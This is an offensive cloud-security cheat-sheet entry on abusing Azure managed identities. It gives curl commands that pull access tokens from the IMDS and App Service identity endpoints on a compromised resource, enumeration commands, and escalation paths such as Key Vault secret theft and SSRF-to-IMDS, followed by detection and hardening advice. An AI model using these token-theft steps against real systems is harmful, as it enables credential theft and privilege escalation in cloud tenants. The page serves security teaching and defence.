---
title: "Azure Managed Identity abuse"
category: "cloud-security"
tags: ["azure", "managed-identity", "privesc"]
platform: "azure"
mitre: ["T1078.004", "T1552.005"]
difficulty: "advanced"
updated: "2026-07-11"
author: "core"
---

# Azure Managed Identity abuse

## TL;DR
A managed identity lets an Azure resource (VM, Function, App Service) get tokens without stored credentials — via IMDS. If you compromise the resource (RCE/SSRF), you can request tokens and act as that identity against whatever it can access.

## Getting a token (from a compromised resource)
```bash
# From a VM (IMDS) – system-assigned managed identity
curl -s -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"

# App Service / Functions – uses IDENTITY_ENDPOINT + IDENTITY_HEADER env vars
curl -s -H "X-IDENTITY-HEADER: $IDENTITY_HEADER" \
  "$IDENTITY_ENDPOINT?resource=https://vault.azure.net&api-version=2019-08-01"
```

## Using the token
```bash
# Enumerate what the identity can do, then act (ARM / Graph / Key Vault)
az login --identity                       # if az CLI present
az role assignment list --assignee <mi-object-id> --all
# Or call ARM/Graph/Key Vault APIs directly with the bearer token
```

## Common escalation paths
```text
- MI with Contributor/Owner on a subscription/RG -> full control
- MI with Key Vault access -> pull secrets/keys/certs
- MI with User Access Administrator -> grant yourself roles
- SSRF in an app -> hit IMDS -> steal the app's MI token (no RCE needed)
```

## Detection (Blue Team)
- IMDS token requests followed by unusual ARM/Graph/Key Vault calls.
- Key Vault access logs: secret reads from a compromised resource's identity.
- Sign-in/audit logs for the service principal (managed identity) from anomalous contexts.

## Mitigation / Hardening
- **Least privilege** on managed identities (scope tightly, avoid Contributor/Owner).
- Mitigate SSRF (app can't reach IMDS if not needed; validate URLs).
- Key Vault: RBAC + firewall + logging; short-lived access; monitor MI token usage.
- Prefer user-assigned MIs with narrow scope; review role assignments regularly.

## Sources
- [Azure Managed Identities](https://learn.microsoft.com/entra/identity/managed-identities-azure-resources/) · [MicroBurst](https://github.com/NetSPI/MicroBurst)
